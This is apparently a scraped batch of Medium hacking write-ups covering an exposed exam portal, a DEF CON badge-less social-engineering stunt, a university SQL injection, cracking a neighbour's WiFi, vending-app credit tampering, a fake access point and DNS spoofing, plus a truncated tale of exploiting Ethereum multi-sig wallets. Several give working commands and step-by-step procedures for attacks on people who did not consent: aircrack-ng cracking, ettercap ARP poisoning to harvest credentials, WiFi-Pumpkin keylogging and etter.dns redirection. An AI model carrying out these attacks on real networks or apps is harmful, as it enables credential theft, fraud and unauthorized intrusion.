Here is a list of all news agencies who covered the story
Also 306 shares on Linkedin
Written by
","['Security', 'Hacking', 'Cybersecurity', 'Tech', 'Jobs']"
How I hacked an online exam portal and gave my exam from my home?,https://medium.com/bugbountywriteup/how-i-hacked-an-online-exam-portal-and-gave-my-exam-from-my-home-dfcbdcd7df98?source=tag_archive---------7-----------------------,"Ever had a bad exam which you know you could have aced if you gave it from the comforts of your room? or if you were allowed to cheat? ’Cause I have that feeling all the time. There was this exam I recently gave, for the exam we had to go to the centre where the exam was being conducted everyone of us was allotted a PC where the web-page for the exam was already opened up in the browsers. We had to type in our credentials, login and then give our exams.
The exam went just above par, but being a crack head that I am, I couldn’t just be satisfied with that, I got adamant on finding a hack regarding it so as to be able to give the exams without being monitored in any way
The whole idea of giving an exam without being monitored was that I should be able to access the exam portal page. The problem comes down to, how to do it? The first idea was to check if the centre had a wireless access point of its own, so that I could hack into it and then access the exam page. The second idea was to get into some other floor of the building and use a ethernet connection to get inside the network.
But these ideas didn’t pan out, so after few attempts I left it for a few days. A week later I decided to carry out reconnaissance on the official website of the organisation that conducted the exam. I hoped that maybe something will pop-up that would help me out and I guess luck was just with me.
When I started to recon the website I went about it in the following manner
i) I first started with Maltego ( love the graph view ) and got a lot of data from the search and spread the whole graph to make proper sense of it.
ii) Simultaneously I was using dirbuster to find different domains that might be useful or I could use to gain access to the exam page, but there were too many domains so I put that on hold.
iii) Did a whois search to figure out more about the DNS and servers and where they are being hosted. Most of them were hosted by the institution itself inside its main building.
iv) Then I went ahead to find to the subdomains, for this work I prefer these two online websites Find Subdomain and DNS Dumpster , here my eye caught something I didn’t expect. I got a lot of data from both the websites but from DNS Dumpster I got a link resembling something like this particular link “http://www.onlineexam.institution.com ”.
As soon I saw this I was sure that it has to be the website where they conducted the exams, at the same time I was also sure that it would not open in my browser. I was carrying out this recon from my home network. I thought it would ask me to join the institution network or it will ask me for some other kind of authentication, but then the magic happened when I opened the website up in the new tab, the webpage loaded exactly as it was when I was giving the exam. My happiness knew no bound at that point of time. To check if it was really working as it should I entered my login credentials and it displayed me this
And so that’s how I easily found a way to give the exam right from my home, without any need to go to the exam centre again anymore.
The admin of the page must be an idiot to host the exam page online for anyone to login from anywhere and give the exam.
i) The page should have been hosted on the local network so that only once you are inside the network then you can access the page and give your exam
ii) One more level of security should have been added, e.g. the invigilator’s code who is present in the exam hall or something like that so that it can avoid other users who have the login credentials from logging in.
Sometimes such small mistakes that seems unimportant in the beginning can lead to huge problems in the future.
If you enjoyed it please do clap & let’s collaborate. Get, Set, Hack!
Website : aditya12anand.com | Donate : paypal.me/aditya12anand
Telegram : https://t.me/aditya12anand
Twitter : twitter.com/aditya12anand
LinkedIn : linkedin.com/in/aditya12anand/
E-mail : aditya12anand@protonmail.com
Written by
","['Archive', 'ABOUT US', 'Bug Bounty', 'CTF', 'Discord Server', 'Interviews', 'Discord Group', 'Cybersecurity', 'Hacking', 'Computer Security', 'Online Exam', 'Reconnaissance']"
How I Hacked DEF CON - freeCodeCamp.org - Medium,https://medium.com/free-code-camp/how-i-hacked-def-con-c5bf718bb9d8?source=tag_archive---------3-----------------------,"Started in 1992 by the Dark Tangent, DEF CON is the world’s longest running and largest underground hacking conference. It’s held yearly in Las Vegas, Nevada every July.
The security industry is a $100B market. As the database of our entire world’s information goes online, software is the the fabric that connects it all. However, where there is software there are vulnerabilities.
In addition, where there are people, there are vulnerabilities. This is where I come in. I’m not a ‘hacker’, or an engineer, sys admin, or programmer. I am in communications. I’m a translator, a chameleon, and an advocate for people, projects and products that I feel are doing things differently.
I decided to go to DEF CON for the first time this year to put myself “in the room” and get a sense of the community, the people and their nuanced archetypes.
Here’s how I did it:
1. Walked the perimeter to locate the entry and exit points
Thursday evening when I arrived, I scoped out Caesars. I walked in, located the conference registration, ran into a few friends and walked around to get the lay of the land. I saw where the big talks were going to be held, mapped out all the elevators, escalators and exits for rooms and hallways. Then, it was time to test my theory: could I walk around the entire conference without a badge?
As I was walking into one of the main elevator rooms I was asked once by a Caesars employee, “excuse me, ma’am, where is your badge?” I replied quickly and softly, “Oh, yes, so sorry. I’m looking for the information booth, it’s this way right?” She nodded, and I continued right past and into a different talk. I always like knowing how to quickly escape if needed.
2. First penetration test: asking for the conference program book
Thursday evening, I walked over to registration and told the lovely staff that I had misplaced the schedule book, could they give me another one? “Yes, no problem!” a volunteer mentioned as they handed one over to me. Great, now I have the schedule and an idea of how strict they are on badges, as well as how well-trained the volunteer staff was.
I always look for the elevators at hotel conferences since it’s always faster than taking the stairs or escalators. On the first day I walked right past registration and took the elevators up to the talks. It was low key, not many talks, so no hassle.
3. Camouflage
I was in need of a fresh shirt after my flight into Vegas and didn’t have time to check into my room at the Flamingo. Trying to find my way around DEF CON, I walked past the Caesars gift store. There it was…. the perfect shirt. A black v-neck Caesars golf shirt. It was professional enough to look official, but casual enough to make me look like a mid level employee. I purchased the shirt for $65, and combined with my black pants and dress shoes the look was complete.
The Caesars shirt was the perfect balance. It was enough to override the DEF CON “goons” since I assumed they were instructed to not mess with hotel staff. It was also perfect to pass by the Caesar’s staff since they were there to focus on maintaining order for the DEF CON attendees, not the hundreds of random Caesars staff members.
4. Walking with conviction
Wherever I went around the conference center, I walked confidently and with purpose at all times. Not too fast as if I were being chased, but not too slow to as if I was lost (even when I was), just enough to show that I had conviction. I wore a grey baseball hat and made a point not to make a lot of eye contact with attendees or look up to read names of rooms, I simply looked forward and continued on my mission. I also looked at my cat watch a lot.
5. Avoiding linecon
Whenever I wanted to go see a talk, I would always locate additional doors to the room. I didn’t wait in a single line for the whole event. Instead I waited for the lines to start moving and joined at the right moment, waited 10 minutes for the talk to start, or simply waited for someone to leave the room after the event started and asked them to hold the door for me.
6. Hacking the Social Engineering Room
By Friday afternoon at 12:30 pm I had seamlessly enjoyed the morning talks and successfully walked around the conference for 4 hours completely undetected. I wanted to up the ante, so I figured I’d give the Social Engineering room a run for their money.
I snuck in the back door, past the line of course, and right into the back of the room. Attendees didn’t give me a second glance since I still looked like hotel staff. I walked in as they were doing a Q&A with the audience after someone just made a phone call in the soundproof room on stage.
Right as the Q&A with the audience was dwindling down… I saw my entrance. I made my way up the side of the room, standing with attention, and glancing diligently at my watch to give the impression of impatience. Then, I took my chance.
I walked right up to the stage technicians who were running the stage, bent down to their table and calmly said…
Me: “Hey guys, I just wanted to let you know that we are having a problem with the air conditioning in this room and we are going to have to evacuate the room as soon as possible.”
Technician 1: Looking slightly confused said calmly, “well ok, sure, we are just about to end for a lunch break. Do you think your team can wait 15 minutes?”
Me: “Well, you know, this is a union house so we really have to have everything super on time or else your conference will incur additional charges… but let me see what I can do. You said you break in 5–10 minutes?”
Technician 2: Looking a little suspicious, “Yes. Ok, so you need to evacuate the whole room? Can some of our staff remain in here?”
Me: “Yes sure that should be fine, but we really need to move quickly and evacuate everyone else in five minutes on the dot.”
Technician 1: “Got it, one second. Let me pull in someone quickly.”
Me: Seeing that they were pulling in the main organizers for the Social Engineering room… extended my hand to the organizer and said, “Hi, my name is Amanda. I don’t work for Caesars. I wanted to see if I could hack the conference and the social engineers!”
Event Organizer: She laughed, she loved it. “Yes! This is great. You nailed it.”
Technician 2: “We had a feeling you might be pulling one on us. But good work, If anyone gives you any problems, just tell them you are with us.”
I smiled, gave her my card and walked out. Mission accomplished.
This entire experience had me thinking. Social engineering is a form of security, but like ‘hacking” it sometimes gets a bad reputation. Let’s think about what applications these techniques can be used for beyond DEF CON.
Social engineering can be used for many things, not just hacking into events, but for many situations in life, even getting out of dangerous real-world situations.
Of course, there was an element of luck in this whole strategy since this was the first year the conference was held at Caesars. This means there is a learning curve for the hotel staff and the DEF CON volunteers.
When it comes to hacking, it’s better to be lucky than good.
Written by
","['Archive', 'Short Story', 'Defcon', 'Social Engineering', 'Cybersecurity', 'Hacking']"
How I Hacked DePauw University Using Hidden Inputs - HackerNoon.com - Medium,https://medium.com/hackernoon/how-i-hacked-depauw-university-using-hidden-inputs-79377c3dca7e?source=tag_archive---------3-----------------------,"For the past month I have been in a conflict with my undergrad university, DePauw, over a vulnerability I found involving university provided student mailboxes. I have been threatened while also being told that they are grateful for what I’ve done.
Over this article I will explain the technicals of the vulnerability, the response from the university and the chain of events that made this the situation it is now, as well as my opinion on the whole thing.
In late August, I discovered a form with hidden inputs in DePauw University’s student E-Services site. The link was used to direct students to a webpage containing their university mailbox number and combination.
Note: If you are not interested in the technicals of the hack, please skip below to “University Reaction.”
This link was different from all the other links, because it was not an <a> tag ( usually used for HTML link objects), but a <form> tag with inputs that were set to be hidden. Additionally, the form had a type field set to sqlform (research on this returned nothing which may suggest it was used by the original developer as documentation into how the form worked). However, the hidden input here had an interesting name: Student ID.
Hidden inputs are sometimes used with the assumption that no one will open up an inspector and submit data other than the data in the formatted webpage. The Mozilla page (also linked above) for hidden inputs even adds that a use case would be security data, such as a token that would invalidate the form if it was changed. Because of this assumption, input sanitization may be looked over or completely forgotten.
That is exactly the case with the form I found. The Student ID field, which can be edited using the Chrome Web Inspector, was not sanitized.
I asked a friend for their Student ID to test this potential vulnerability. Sure enough, submitting the form with the modified data was enough for the system to spit out the correlating mailbox number and combination.
This was scary. This hole may have existed and exploited for years without anyone knowing. The HTML 2.0 (1995) specification includes hidden inputs, but it’s unlikely that this webpage has existed for 22 years. That being said, it is still a possibility.
Logs exist that can trace exploitation retroactively, but searching them takes an extremely long time and effort that is put to better use by patching the hole (fix the leak) and changing the combinations (clean up the mess).
I submitted a report to the HelpDesk (University IT department) as well as some upper level management detailing the vulnerability with steps to reproduce.
However, I suspected that the problem was worse than I had initially found. If the input data is not sanitized, as well as the fact that the form is of type sqlform, could it be vulnerable to an SQL-injection?
There are a number of SQL-injections that can have devastating, irreversible effects on a system, so in choosing my injection I needed to be careful. Instead of trying to execute a DROP TABLE attack, which may delete the database forever, one could insert OR 1=1. I was working with the assumption that submitting the form would execute:
Where, if the input is the student ID from the form, evaluates to:
Because 1=1 is always true, this statement evaluates TRUE for every row in the table. Subsequently, every single mailbox number and correlating combination were returned, viewable from Chrome.
I promptly submitted this issue, hoping to show the university that their problem is much worse than my initial email suggests. The problem was promptly fixed before the end of the day.
All university faculty names and position titles have been censored for their protection.
For finding a vulnerability that leaked thousands of personal information, I was expecting to be met with complete gratitude. I was prepared to ask permission to write an article about what had happened, which was the only reward I wanted at the time.
A meeting was set for Monday, August 28, with one of the system administrators so that they could make sure to get all the technical details from me. Since the vulnerability was fixed, I asked if I could publish an article about the leak online. I was told that the system administrator did not have the authority and that I would have to wait until my next meeting, where a higher-up would detail exactly what was going to happen.
My meeting with the higher-up was set for Wednesday, August 30, to discuss and hopefully wrap up the discussion about what was going to happen. I faced a series of questions including why I did it as well as what my intentions were. I was also notified that every single mailbox combination would need to be changed because of the vulnerability, and it was suggested that this was a direct consequence of my actions, a statement which would later be explicitly expressed. Upon asking if I could publish an article detailing the leak, I was told that they would prefer I did not release any information, but that they could not stop me since they were not the police.
The third meeting, which was set up via text message via the higher-up’s secretary a few hours before the requested meeting time, took place Thursday, August 31. I was met with another line of questions similar to the previous meeting, but for another university representative that would like to get the information from me first-hand. I was then told that the university is not going to reveal my identity and asked that I not reveal myself for any of the following reasons:
I was then reminded of the consequences of my actions (all of the mailboxes were going to be changed the next week) and was asked what I thought about that.
It was at this point that I told them that it is not my fault that the changes have to happen but the fact that their system was vulnerable in the first place and that this may have been exploited any number of times, and mail may have been stolen in the past as a result. This moment was significant because this was the first time, in all of my meetings, where I chose to interject my opinion into the conversation, and it would not be the last.
I was then told that the university may have a responsibility to report me to the police because the information I accessed was sensitive enough that I may have broken the law.
Afterwards, my father contacted a lawyer because my alma matter was suggesting they may turn me into law enforcement.
An email went out at 7:23am on September 4, detailing to the student body what had occurred:
A week later, The DePauw, the student run newspaper at DePauw University, was tipped off about my role in the mailboxes. I was notified that I had an opportunity to sit down and interview, as well as reveal my role in the mailboxes. After contemplation, I agreed to a short sit down interview.
The DePauw Article on the situation can be read here. I strongly suggest you read the article before continuing.
After the article was published on September 12, I was approached multiple times by faculty and students saying that what the university was doing was unbelievably wrong and that I was in the right. Some faculty even approached me saying that they were willing to do whatever they can to make this right, including writing letters and emails to the administration.
With the student body and faculty now backing me, I was comfortable finding more vulnerabilities in the system. My naive belief was that the university would admit to their mistakes and accept my help.
Two vulnerabilities were obtained using the same method as above, but for two different sources:
I submitted these and they were patched within a day.
A week later, on September 22, I had my final meeting with the second higher-up as a wrap-up of the whole situation, as well as find out if the university would be pursing action against me.
I was first told that no action would be taken against me (phew!). I was also told that the university was surprised that I reported being ‘off-put’ by their actions and that they believed they were acting according to their responsibilities. We then proceeded to talk through the following letter:
In response, one of the main points I tried to make is how authentication on a server works and permissions of data on a system. I was authenticated to access data at a student level, and data (mailbox combinations) were accidentally treated as accessible by students, which is how I was able to access the data. This was not accepted and I was told that I accessed unauthorized data by tampering and/or “poking around” university information systems.
In addition to everything in the letter, I was told that the university is hiring “outside people to come and fix the system,” which may mean a full security audit, something that should have been done and announced at the first report. I was also told that because of these paid professionals, my work would no longer be welcome and will be met with punishment.
I have attempted to tell a linear story of the events that occurred while leaving my opinion out so that you, the reader, has the opportunity to form your own opinion on the subject. That being said, I do have opinions about everything that has happened that I feel need to be heard.
First, the reaction of changing the codes took over 12 days after the vulnerability was found. This means that any of the following may be true:
I think that the university was given an opportunity to encourage students to make their own information more secure. It is worth noting that all this happened in the same month that Equifax was hacked, leaking 143 million records of personal information and a white-hat hacker found a vulnerability that affects too many companies for him to consult them all. By responding the way they have, they are discouraging future students from notifying them of their security lapses, as well as discouraging activities that are generally welcomed by the tech industry. It is the twenty-first century, and the era of information has a new set of rules that can benefit everyone, but only if you allow it.
The biggest problem I see with what happened is that the university was so focused on keeping me quiet that they threatened legal action, while citing reasons such as “for my protection,” and that it would damage the same alma matter that was threatening me in the first place. Transparency in situations where information has been leaked is so important, and when the email reads “a limited amount of information was accessed” and not “all of the information has been leaked,” I think that there is something that must be done to notify those impacted.
There are five reasons above that the university cited for me to keep quiet. I’d like to address all five here:
This whole process has been enlightening yet disappointing for me. At one point I realized that I was able to outsmart a university engineer, which was personally validating of my own skills. The consequences of which were that the university tried to cover it up and keep me quiet, disappointed me in how forward thinking I think this university is.
Written by
","['About', 'Help', 'Go Home', 'Security', 'HTML', 'University', 'Forms', 'Cybersecurity']"
How I hacked into my neighbour’s WiFi and harvested login credentials?,https://medium.com/bugbountywriteup/how-i-hacked-into-my-neighbours-wifi-and-harvested-credentials-487fab106bfc?source=tag_archive---------0-----------------------,"It has been almost a week since I wrote my last article, which gained a lot of attraction.
How I pranked my friend using DNS Spoofing?
Since, then I have been playing around with network sniffing tools and trust me there is a different kind of high you get when you sniff the traffic of networks. The thing is it’s not much fun when you are sniffing your own network, you know what’s the traffic is going to be and all. The fun begins when you are on someone’s else network, that’s when the thrill starts. You go through each and every Wireshark packet carefully, hoping to find login credentials or something valuable of sorts. That’s when I decided let’s hack into the nearby WiFi network and sniff out the packets.
So, to begin with the hack first I had to search for different WiFi signals in the nearby area, there were a few of them.
Once, I checked for the WiFi networks then I turned on my Kali machine to hack into one of these networks. I opened up my terminal and typed in
wifite
Wifite, is one of the most user friendly tool out there you can use for hacking WiFi ( that’s just my opinion ). The information shown below popped up.
Now if you are a hacker, then you already know which network I would have tried to hack in. Yes, “IP on Firewall”. I mean if you name your WiFi, Firewall then it is like asking nearby hackers to mess with you, and so I choose it.
As soon, as the target was selected “ wifite ” ran the packet capture for “IP on Firewall”, it found the hosts connected to it and sent out de-auth packets for a few moments till the time the device was disconnected. Once the device got disconnected, the device tried to connect back to the WiFi router and during this process “ wifite ” captured the packet with the password for the WiFi in encrypted form.
Now, that once the capture file was present with me. I ran it against the rockyou.txt wordlist file using aircrack-ng, the command was as follows.
aircrack-ng -w rockyou.txt -b <bssid> <capture file name>
I let it run for a few minutes at max, when I got a hit on the password.
Once, I obtained the password, the next thing was to go ahead and sniff-out their traffic and look for interesting things.
I was feeling ecstatic as soon as I figured out the password of IP on Firewall. The reason was, if they had not used such a simple password which was present in the rockyou.txt file, then the whole process would have been bogged down, I guess it was my lucky day.
Once I got into the network then I started ettercap, ( one of the best tool out there to sniff packets ). I wanted to capture each and every packet on their network, so I opened up terminal and typed in the following command.
ettercap -T -M arp -i eth0 /// -w test.cap
( To refer the ettercap tutorial visit here : Ettercap Packet Sniffing )
As soon as I initiated the ettercap, tons and tons of traffic was passing through on my terminal screen. I saved it all to the test.cap so that I can later on go through each and every packet on my device using Wireshark for detailed inspection.
If you want to go through the traffic on your Kali machine then you can use the following commands
cat test.cap | grep -a <keyword>
Using the above command you can search for the keyword you want to search for, the below command gave me the following output
cat test.cap | grep -a password
Once, I transferred the file to my laptop for further inspection I picked up many other login credentials which were entered on HTTP websites. The websites the users were visiting and many other interesting information.
So, now you know why there is such a high about intercepting other people’s traffic.
The biggest take away from this hack is to never use HTTP websites and above all never use your credentials to login on those websites. You may never know who else might be sniffing the network and they will pick up your login credentials all just by viewing the network traffic. If feasible then use your VPN services to encrypt your traffic, they provide you with security no matter where you are. So the next time you encounter websites that are not https, just run away or be really careful to not leak anything personal information.
If you enjoyed it please do clap & let’s collaborate. Get, Set, Hack!
Website : aditya12anand.com | Donate : paypal.me/aditya12anand
Telegram : https://t.me/aditya12anand
Twitter : twitter.com/aditya12anand
LinkedIn : linkedin.com/in/aditya12anand/
E-mail : aditya12anand@protonmail.com
Written by
","['Archive', 'ABOUT US', 'Bug Bounty', 'CTF', 'Discord Server', 'Interviews', 'Discord Group', 'Hacking', 'Computer Security', 'Cybersecurity', 'Wifi', 'Hacks']"
How I hacked modern Vending Machines - HackerNoon.com - Medium,https://medium.com/hackernoon/how-i-hacked-modern-vending-machines-43f4ae8decec?source=tag_archive---------1-----------------------,"Indisputably, Vending Machines are objects of cult. Delicious morsels of Hackers, always. In the beginning they worked offline with coins only, then, NFC- keys/cards models started spreading. If I say “COGES” I’m sure that better times will come to someone’s mind. But… In a bunch of years things changed radically. You distract and a moment after, find the world superseded by things connected to the internet…
One day I decided to interrupt seasoning myself in the bat-cave and direct to my hometown to get some sunlight, so I went to the University to salute an old professor.
“Go to have a coffee!” — he said— and we started chit-chatting while walking through the main corridor.
Once arrived…
Me: “let me pay, I have coins!”.Him: “wait wait! let me use the Vending Machine’s App to pay, the coffee will be cheaper”.
BLE + NFC
Brain: “Mmm… Virtual wallets are cool stuff…”.
Excellent.
Soul: “I dare you to Hack into that!”
~$ White Hat inner voice: “just pats on the shoulder if no bug bounty reward”.~$ Grey Hat inner voice: “ok, I’ll do that for educational purposes only”.~$ Black Hat inner voice: “c’mon man, let’s screw that HEAP, great Jupiter!”.
Later in that day…
Pwnie express.
Needless to say that I picked up my dirty rooted Android smartphone (with USB Debugging Enabled), installed the targeted App from the Play Store and dumped the original *.apk to my laptop via adb.
I decompiled the *.apk with apktool
and extracted Java sources with jadx
Firstly, I made the *.apk debuggable by editing the AndroidManifest.xml file by adding android:debuggable=""true"" property to the application <tag>
Then, I rebuilt the *.apk
created a new key with keytool
signed the *.apk with jarsigner using the generated key
lastly, I zip-aligned it to make it runnable
and I installed the final *.apk
I ran the App on the smartphone and I started looking at logs with logcat by filtering them via its package name
Nothing special found, so I started to comb through the source codes seeking for juicy information.
Looking better at AndroidManifest.xml file, I found references to RushOrm
So, first keyword search was db_name
Cool. I booted up the Root Explorer on the phone seeking for argenta.db
Found. So I pulled it to my laptop with adb
and tried to open it with a DB Browser for SQLite
obviously, it was password protected
Step back to the source codes, looked at RushAndroidConfig.java
where I found the methods used to configure the database.My attention was caught by this.encryptionKey = getDeviceId(context);
I moved to its definition and…
Found that the targeted App used the phone’s IMEI (*#06#)as encryption key for the SQLite database.
Abracadabra.
Boom baby.
After a couple of seconds of inspection, I opened to the UserWallets table
and edited the walletCredit field writing changes
then I pushed the database with pumped credit back to the phone
In the meantime, while I felt like “Robin Hood” (nostalgic and explicit reference to Age Of Empires cheat code for +1000 gold) I developed an Android utility to quickly dump/restore/tamper the targeted App’s database on the fly.
then I went back to my University again to finally test the Hack
Dear diary…
From zero-credit account, I could:
> Inflate the App’s credit.> Buy stuff.> Get the remaining credit updated.> Go back to zero-credit state.> Inflate the credit again.> Start over.
With a macro inspection of all the reversed sources I found huge portion of clean code — without obfuscation — that meant no great counter-measures adopted to protect user data and make the App secure at all.
A month ago…
The White Hat inner voice of me picked up the phone and called the company behind this shame to report the vulnerability. I gently suggested them to toss the current architecture and develop a better and secure one from scratch.
Hocus bogus.
Written by
","['About', 'Help', 'Go Home', 'Android', 'Cybersecurity', 'Hacking', 'Reverse Engineering', 'Vending Machines']"
How I made a fake access point to harvest login credentials?,https://medium.com/bugbountywriteup/how-i-made-a-fake-access-point-to-harvest-login-credentials-6898efb96b3b?source=tag_archive---------6-----------------------,"This article is kind of a continuation to the last one I wrote.
How I hacked into my neighbour’s WiFi and harvested login credentials?
It’s better if you go through it, but still let me explain it to you in short. I hacked into a wifi network by cracking the password using dictionary attack and then monitored the traffic. The only problem with this attack is it’s not guaranteed to work all the time, as the dictionary attack won’t work. One of the readers raised this question.
That got me thinking that what could be other possible scenarios where I can get people’s traffic, without having to rely on luck, like them using easy passwords or a WEP connection etc. That’s when it struck me what if I create a fake access point and use that to harvest login credentials.
The whole idea was to create a free wifi point, without any password. Grant access to anyone who gets connected to it. Now that it doesn’t ask for any password anyone whose wifi is turned on will automatically get connected to the fake wifi point and all the freebies will definitely be attracted to it.
So, the first thing I had to do was to create the fake access point. To carry that out I used the tool called as wifi-pumpkin. The best thing about this tool is that it lets you set up a fake access point with incredible simplicity. Once, you clone the tool from the Github repository into your Kali machine, just make sure you have installed hostapd as well in your Kali machine, as it requires that.
The GUI version of WiFi-Pumpkin looks something like the picture in the side. You can easily set up the whole network features according to your needs.
Everything you need to setup the fake access point is available under the “Settings” tab.
Here you can configure the name of the wifi, provide it with a BSSID, which channel do you want it to work on, choose the network adapter and many more features. You can go ahead and also assign the IP range, the activities you want to monitor etc.
So after all the configuration is done you can go ahead and start the fake wifi. It is preferred to setup the fake wifi point with a common name, like “Free -Wifi” or “Jio-Net” or the name of a nearby shop or something like that. It helps to establish trust with the users, so that they will use your fake wifi point without any hesitance. Once you boot up your wifi point, the devices starts to get connected and all of them will be listed in the “Home” tab.
You can view all the logs in the “Activity-Monitor” tab, it has all the logins the user made on any of the http websites, it has the logs of every website the user visited while he was connected to your fake access point.
You can enhance the level of the hack by using different plugins present under the “Plugins” tab, it has many advanced tools one of them is key-logger. Under the “Images-Cap” you can view all the images that is being loaded on the website that the user is visiting.
This gives you complete access to all the details of the user who is utilising your WiFi point. You can’t perform a better attack than this on a network ( that’s my opinion ).
So, the most basic thing here is never ever use a free wifi point until and unless you have complete trust over it. Anyone on that network could be sniffing your traffic and you will never know, till it’s too late.
Whenever logging into banking websites or your social network accounts always make sure that you are using a trusted network or even better use your own data on your mobile phones. That will keep you secure to a huge extent and unwanted leak of your data won’t take place.
If you enjoyed it please do clap & let’s collaborate. Get, Set, Hack!
Website : aditya12anand.com | Donate : paypal.me/aditya12anand
Telegram : https://t.me/aditya12anand
Twitter : twitter.com/aditya12anand
LinkedIn : linkedin.com/in/aditya12anand/
E-mail : aditya12anand@protonmail.com
Written by
","['Archive', 'ABOUT US', 'Bug Bounty', 'CTF', 'Discord Server', 'Interviews', 'Discord Group', 'Security', 'Network Security', 'Hacking', 'Wifihacking', 'Cybersecurity']"
How I pranked my friend using DNS Spoofing? - InfoSec Write-ups - Medium,https://medium.com/bugbountywriteup/how-i-pranked-my-friend-using-dns-spoofing-6a65ff01da1?source=tag_archive---------4-----------------------,"Now who doesn’t love a great prank story? You know the whole idea of hacking first started by pranksters trying to do crazy things and tinkering with stuff to get them to do odd things. This article is similar to that where I pranked my friend using DNS spoofing.
DNS spoofing is a form of computer security hacking in which corrupt Domain Name System data is introduced into the DNS resolver’s cache, causing the name server to return an incorrect result record. This results in traffic being diverted to the attacker’s computer (source Wikipedia)
The only requirement of this attack is that the user should be on your network. So, my friend and I was using the same LAN connection. While he was busy watching a movie I was saving this trick for him. I booted up my Kali machine and began the process of DNS spoofing.
Figure out the IP address of your own machine and the interface via which you are connected to the internet.
Once, you know the IP address of your own machine and the interface, figure out the gateway IP address.
Then, go ahead and scan for the systems on your network. This will help you to find the device you want to target and their IP address.
Once, the scan is done and complete you would know the IP address of your victim.
Now go ahead and type this ahead in the terminal.
gedit /etc/ettercap/etter.conf
This, will open the ettercap configuration files, a tool we will use ahead to carry out the process of spoofing. Once, the configuration file is opened then go ahead and change the values of the ec_uid and ec_gid from default values to zero.
Once, that is done proceed further down, till you see the below image. By default the redir_command_on and redir_command_off under the iptables, will be commented using a # symbol, remove the symbol to uncomment it.
As soon as you make the above changes, go ahead and save it and then close it. Fire up ettercap ( GUI version ), click Sniff, then Unified sniffing, this lower box will pop up go ahead and choose your network interface.
As soon as you click “OK”, sniffing process starts. You have to stop it for the time being.
Once, you do that then go ahead and scan for hosts using ettercap, this option is present under “Hosts” tab. Once, the scan is complete check the “Host List” to get the IP addresses in ettercap. Now we need to assign Target 1 & Target 2.
The IP address of the victim (the system we are attacking) is Target 1, whereas IP address of the gateway router is the Target 2. Once, this is assigned then proceed to “ARP Poisoning” under the “Mitm” tab and select Sniff remote connections.
After completing the above steps go to plugins and double click on the “dns_spoof” plugin to activate it.
Now to the last process which is the most important of all. In this step we need to setup the redirects for which particular websites we need to redirect the traffic to our page that we have setup on our machine. Go ahead and type the following in the terminal.
gedit /etc/ettercap/etter.dns
This will allow us to manipulate the dns tables, enabling us to re-route the traffic from the victim’s system to our locally hosted website. Here I added websites like facebook.com, *.facebook.com, twitter.com and more to be re-directed to the page I am hosting on my machine.
Now that this process is done with, change the html code present in the given location /var/www/html/index.html and insert whatever you desire. After all this is completed type in the following in the terminal.
service apache2 start
As soon as the apache service starts, go back to ettercap and start the sniffing process. Now your attack is complete, and all the victim has to do is visit the websites you have included in your DNS tables.
Now, after my friend was done with his movie and opened up a website, this particular notice was there to greet him.
My friend was in a deep shock for few moments, before realising that I pulled a prank on him.
Attacks like this can be conducted on a bigger scale and if carefully constructed they could be fatal as it could be any banking website login page or your login credentials to your social networking websites. Attackers can harvest your data by redirecting you to their very own websites, which can be deadly.
If you enjoyed it please do clap & let’s collaborate. Get, Set, Hack!
Website : aditya12anand.com | Donate : paypal.me/aditya12anand
Telegram : https://t.me/aditya12anand
Twitter : twitter.com/aditya12anand
LinkedIn : linkedin.com/in/aditya12anand/
E-mail : aditya12anand@protonmail.com
P.S. This attack didn’t work on the HTTPS websites, due to lack of proper certificate. It threw an error like the one below. I am sure there is a way around it, just trying to figure out how to do it. Do share it, if you know how to bypass this.
Written by
","['Archive', 'ABOUT US', 'Bug Bounty', 'CTF', 'Discord Server', 'Interviews', 'Discord Group', 'DNS', 'Hacking', 'Spoofing', 'Cybersecurity', 'Computer Security']"
"How I Snatched 153,037 ETH After A Bad Tinder Date - Mitch Brenner - Medium",https://medium.com/@rtaylor30/how-i-snatched-your-153-037-eth-after-a-bad-tinder-date-d1d84422a50b?source=tag_archive---------0-----------------------,"Over the weekend, I did a lot of swiping right. I’ve never had a Tinder go this fast from match to agreeing on a date time this fast before. I was thrilled! On the following Friday we went out. The evening started nice, but he got creepier and creepier by the hour. A few hours in, he’s a full-on creep. I had to bolt. Not a big deal — I prefer a night tracing scam ICO’s transactions anyway.
Okay, so, in the day I sit and watch streams of Bitcoin and Ethereum transactions flowing from markets escrow accounts to sellers, from exchanges to users, from users to mixing party contracts, and so on and so forth, flagging interesting transactions, following flows between accounts suspected of activities such as child pornography exchange, human trafficking, etc. 8 hours a day everyday. At night, when I’m not peer-pressured into going to a bar, I do the same thing but for my own fun. These days I track ICOs that are obviously scams and see how they move their money around. It can be quite fun, but that’s a post for another day.
Alright. Friday night. Noise from Bastille Day’s fireworks is filling the skies. I’m following a transaction trail I’ve worked on for a couple of weeks. One of the bigger transactions originated from a multi-sig wallet smart contract. I don’t know why I did that, but I clicked in the Etherscan link and skimmed through the code. I remember finding it funny how Gav/Nicolas wrote that assembly piece there to call an internal method (initWallet) in a the wallet library. Solidity is a shit language, so I wasn’t all that surprised. But, I mean, really? Wasn’t it so that you can call internal methods normally from derived contracts? I dunno, I’m not a Solidity programmer.
So I wanted to see how much of a moron either Gav/Nicolas or yours truly are, and decided to try it myself. I created wallet’s contract in my privatenet and referenced in another contract and tried to call initWallet(). No go. So I thought to myself “Hmm.. what if I make it an external method?”. So I scrolled to it and tried to remove the internal modifier. But wait! There’s no internal modifier in the first place. �
Okay okay. Deep breath. What does this mean? Well, young man, this means whomever has money in such wallet is possibly ducked! To be sure, I tried calling initWallet() externally with an arbitrary owner address. Sure enough, the wallet added me as an owner. DUCKED, I SAY!
At this stage, I wasn’t really sure what to make of it. Even with my non-existent sense of morality, I didn’t feel like cleaning the 253 ETH in the wallet I first found because it was too low to bother. Now, I’m not a rich guy, so 253 ETH is a nice amount of money, which is about half a year salary, but I don’t want burn this find on 253 ETH, plus I don’t know this guy so I left it alone.
Obviously, if I can get enough money for a nice early 20s retirement out of this, I’m not gonna say no. I mean, would you? I mentioned I’m not rich, but I’m not poor either, but this is very lucrative. I can finally pay off my mom and dad’s mortgage, buy my older brother a car, pay off my sister’s college lo… STOP! You’re daydreaming again! Now I need to find other vulnerable wallets with a lot of money in them.
But how? I’m good with analyzing data, writing code that spots patterns and anomalies, even stalk people online (for science! Well, for work actually), but I know almost nothing about how Ethereum works, how smart contracts are stored, or pretty much anything that would help me locate those wallets. The only thing I have is a fast-synced Ethereum blockchain fully cashed in RAM. I tried basic grepping, but I had no success. The blockchain isn’t your grandmother’s DB. Time to change gears. I’ve done basic things in Geth before, but now it’s time to learn some Ethereum JavaScript API.
The plan is straightforward:
